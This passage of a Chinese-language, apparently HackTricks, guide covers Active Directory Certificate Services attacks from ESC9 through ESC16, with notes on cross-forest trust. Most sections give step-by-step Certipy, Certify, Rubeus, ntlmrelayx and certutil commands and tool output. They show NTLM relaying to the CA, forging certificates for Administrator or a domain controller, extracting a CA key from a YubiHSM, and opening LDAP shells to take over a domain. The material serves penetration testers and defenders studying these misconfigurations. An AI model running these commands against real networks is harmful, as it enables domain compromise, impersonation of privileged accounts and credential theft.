certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
在此过程之后，`Jane` 的 `userPrincipalName` 会恢复为原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
要通过 Schannel 进行身份验证，使用 Certipy 的 `-ldap-shell` 选项，显示身份验证成功为 `u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过 LDAP shell，像 `set_rbcd` 这样的命令可用于发起 Resource-Based Constrained Delegation (RBCD) 攻击，可能导致 domain controller 被妥协。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
这个漏洞同样影响任何缺少 `userPrincipalName` 或其与 `sAMAccountName` 不匹配的用户账户，默认的 `Administrator@corp.local` 是主要目标之一，因为它具有较高的 LDAP 权限，并且默认缺少 `userPrincipalName`。

## 将 NTLM 中继到 ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务在不进行签名的情况下发动 NTLM 中继攻击。 [参考](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

你可以使用 `certipy` 来枚举 `Enforce Encryption for Requests` 是否被禁用，certipy 会显示 `ESC11` 漏洞。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 滥用场景

需要搭建一个中继服务器：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，我们必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## 使用 YubiHSM 获取对 ADCS CA 的 shell 访问 - ESC12

### 说明

管理员可以将证书颁发机构（Certificate Authority，CA）配置为将其私钥存放在外部设备上，例如 "Yubico YubiHSM2"。

如果 USB 设备通过 USB 端口连接到 CA 服务器，或在 CA 服务器为虚拟机时通过 USB device server 连接，Key Storage Provider 在生成并使用 YubiHSM 中的密钥时需要一个认证密钥（有时称为 "password"）。

该密钥/密码以明文形式存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 下。

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 滥用场景

如果 CA 的私钥存储在物理 USB 设备上，而你获得了对服务器的 shell 访问，则有可能恢复该私钥。

首先，你需要获取 CA 证书（这是公开的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令，使用 CA 证书及其私钥伪造一个任意的新证书。

## OID Group Link Abuse - ESC13

### 解释

`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板中。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) 中被发现。可以使用该对象的 `msDS-OIDToGroupLink` 属性将策略链接到 AD 组，从而使系统在用户出示该证书时将其授权为该组的成员。 [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

换句话说，当用户有权限注册/申请证书且该证书链接到一个 OID group 时，该用户可以继承该组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 滥用场景

查找一个用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 有权限注册 `VulnerableTemplate`，该用户可以继承 `VulnerableGroup` 组的权限。

所需做的只是指定该模板，它就会获得一个具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 易受攻击的证书续期配置 - ESC14

### 说明

在 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 的描述非常详尽。以下为原文引用。

ESC14 处理源自“弱显式证书映射”的漏洞，主要通过对 Active Directory (AD) 用户或计算机帐户上的 `altSecurityIdentities` 属性的误用或不安全配置产生。这个多值属性允许管理员手动将 X.509 证书与 AD 帐户关联以用于身份验证。填充了显式映射后，这些映射可以覆盖默认的证书映射逻辑，默认逻辑通常依赖于证书 SAN 中的 UPN 或 DNS 名称，或嵌入在 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中的 SID。

“弱”映射发生在 `altSecurityIdentities` 属性中用于标识证书的字符串值过于宽泛、容易猜测、依赖非唯一的证书字段，或使用易被伪造的证书组件时。如果攻击者能获得或伪造一个其属性匹配该特权帐户的弱定义显式映射的证书，就可以使用该证书进行身份验证并冒充该帐户。

潜在的弱 `altSecurityIdentities` 映射字符串示例包括：

- 仅通过常见的 Subject Common Name (CN) 进行映射：例如，`X509:<S>CN=SomeUser`。攻击者可能能从较不安全的来源获得具有该 CN 的证书。
- 使用过于通用的 Issuer Distinguished Names (DNs) 或 Subject DNs，而没有进一步限定（例如特定的序列号或 subject key identifier）：例如，`X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他可预测的模式或非加密标识符，攻击者可能能够在合法获取或伪造的证书中满足这些条件（例如当他们已妥协 CA 或发现如 ESC1 中的易受攻击模板时）。

`altSecurityIdentities` 属性支持多种映射格式，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（按完整 Issuer 和 Subject DN 映射）
- `X509:<SKI>SubjectKeyIdentifier`（按证书的 Subject Key Identifier 扩展值映射）
- `X509:<SR>SerialNumberBackedByIssuerDN`（按序列号映射，隐含由 Issuer DN 限定）- 这不是标准格式，通常是 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（按 SAN 中的 RFC822 名称映射，通常是电子邮件地址）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（按证书原始公钥的 SHA1 哈希映射 - 通常是强的）

这些映射的安全性在很大程度上取决于映射字符串中所选证书标识符的具体性、唯一性和密码学强度。即使在域控制器上启用了强证书绑定模式（主要影响基于 SAN UPN/DNS 和 SID 扩展的隐式映射），如果 `altSecurityIdentities` 条目配置不当，或者映射逻辑本身存在缺陷或过于宽松，仍可能直接导致冒充风险。

### 滥用场景

ESC14 针对 Active Directory (AD) 中的显式证书映射，具体为 `altSecurityIdentities` 属性。如果该属性被设置（出于设计或配置错误），攻击者可以通过出示与映射匹配的证书来冒充帐户。

#### Scenario A: 攻击者可以写入 `altSecurityIdentities`

前提条件：攻击者对目标帐户的 `altSecurityIdentities` 属性具有写权限，或对目标 AD 对象具有以下任一权限，从而能够授予该写入：
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: 目标通过 X509RFC822（电子邮件）具有弱映射

- 前提条件：目标在 altSecurityIdentities 中存在弱的 X509RFC822 映射。攻击者可以将受害者的 mail 属性设置为匹配目标的 X509RFC822 名称，作为受害者申请证书，然后使用该证书以目标身份进行身份验证。

#### Scenario C: 目标具有 X509IssuerSubject 映射

- 前提条件：目标在 `altSecurityIdentities` 中具有弱的 X509IssuerSubject 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为匹配目标的 X509IssuerSubject 映射中的 Subject，然后以受害者身份申请证书，并使用该证书以目标身份进行身份验证。

#### Scenario D: 目标具有 X509SubjectOnly 映射

- 前提条件：目标在 `altSecurityIdentities` 中具有弱的 X509SubjectOnly 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为匹配目标的 X509SubjectOnly 映射中的 Subject，然后以受害者身份申请证书，并使用该证书以目标身份进行身份验证。

### 具体操作

#### Scenario A

请求证书，使用证书模板 `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
保存并转换证书
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
使用证书进行身份验证
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
清理（可选）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
有关各种攻击场景下的更具体攻击方法，请参阅以下内容： [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 解释

在 https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 上的描述非常详尽。下面引用原文：

使用内置的默认 version 1 证书模板，攻击者可以构造一个 CSR 来包含优先于模板中指定的 Extended Key Usage 属性的 application policies。唯一的要求是 enrollment 权限，并且可以使用 **_WebServer_** 模板生成 client authentication、certificate request agent 和 codesigning 证书

### 滥用

下述内容参考了 [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 场景 A：通过 Schannel 直接冒充

**第 1 步：请求证书，注入 "Client Authentication" Application Policy 和目标 UPN。** 攻击者 `attacker@corp.local` 使用 "WebServer" V1 模板针对 `administrator@corp.local`（该模板允许申请者提供的 subject）。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 易受攻击的 V1 模板，带有 "Enrollee supplies subject"。
- `-application-policies 'Client Authentication'`: 将 OID `1.3.6.1.5.5.7.3.2` 注入到 CSR 的 Application Policies 扩展中。
- `-upn 'administrator@corp.local'`: 在 SAN 中设置 UPN 以进行冒充。

**步骤 2：使用获得的证书通过 Schannel (LDAPS) 进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 情景 B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**步骤 1：从 V1 模板（带有 "Enrollee supplies subject"）请求证书，注入 "Certificate Request Agent" Application Policy。** 此证书是给攻击者 (`attacker@corp.local`) 成为 enrollment agent。这里没有为攻击者自身指定 UPN，因为目标是获取 agent 能力。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: 注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用“代理”证书代表目标特权用户请求证书。** 这是一个类似 ESC3 的步骤，使用步骤 1 的证书作为代理证书。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**步骤 3：使用 "on-behalf-of" 证书以特权用户身份进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上禁用安全扩展（全局）-ESC16

### 解释

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** 指的是这样一种情况：如果 AD CS 的配置未强制在所有证书中包含 **szOID_NTDS_CA_SECURITY_EXT** 扩展，攻击者就可以通过以下方式利用该问题：

1. 请求一个 **没有 SID binding** 的证书。

2. 使用该证书 **以任何账户进行身份验证**，例如冒充高权限账户（如 Domain Administrator）。

你也可以参考这篇文章以了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### 滥用

The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.

要识别 Active Directory Certificate Services (AD CS) 环境是否易受 **ESC16** 影响。
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**步骤 1：读取受害者帐户的初始 UPN（可选 - 用于恢复）。
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**步骤 2：将受害者账户的 UPN 更新为目标管理员的 `sAMAccountName`。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**第 3 步：（如有需要）获取“受害者”账户的凭据（例如，通过 Shadow Credentials）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: 以 "victim" 用户的身份从 _any suitable client authentication template_（例如 "User"）向 ESC16-vulnerable CA 请求证书。** 因为该 CA 易受 ESC16 漏洞影响，它会自动在颁发的证书中省略 SID security extension，无论该模板对此扩展的具体设置如何。设置 Kerberos credential cache 环境变量（shell 命令）：
```bash
export KRB5CCNAME=victim.ccache
```
然后请求证书：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**第 5 步：还原 "victim" 帐户的 UPN。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**步骤 6：以目标管理员身份进行身份验证。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## 使用证书破坏林（被动语态说明）

### 由被入侵的 CAs 导致的林信任破坏

对 **cross-forest enrollment** 的配置相对简单。来自 resource forest 的 **root CA certificate** 会被管理员**发布到 account forests**，并且来自 resource forest 的 **enterprise CA** 证书会被**添加到每个 account forest 的 `NTAuthCertificates` 和 AIA 容器中**。需要说明的是，这种安排赋予了 resource forest 中的 **CA 完全控制权**，对其管理 PKI 的所有其他林都适用。如果该 CA 被攻击者**compromised by attackers**，攻击者就可以**forge**资源林和帐户林中所有用户的证书，从而破坏林的安全边界。

### 授予外部主体的 Enrollment 权限

在多林环境中，需要对那些 Enterprise CAs **publish certificate templates** 的情况保持警惕，这些模板允许 **Authenticated Users or foreign principals**（属于 Enterprise CA 所在林之外的用户/组）具有**enrollment and edit rights**。\
在跨信任进行身份验证时，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个域拥有一个 Enterprise CA，其模板**allows Authenticated Users enrollment rights**，则该模板可能会被来自不同 forest 的用户**enroll**。同样，如果模板将**enrollment rights 明确授予一个 foreign principal**，则会由此创建一个**cross-forest access-control relationship**，允许一个 forest 中的主体去**enroll**另一个 forest 的模板。

这两种情况都会导致从一个 forest 到另一个 forest 的**attack surface 增加**。证书模板的设置可能被攻击者利用，从而在外部域获得额外权限。

## 参考资料

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
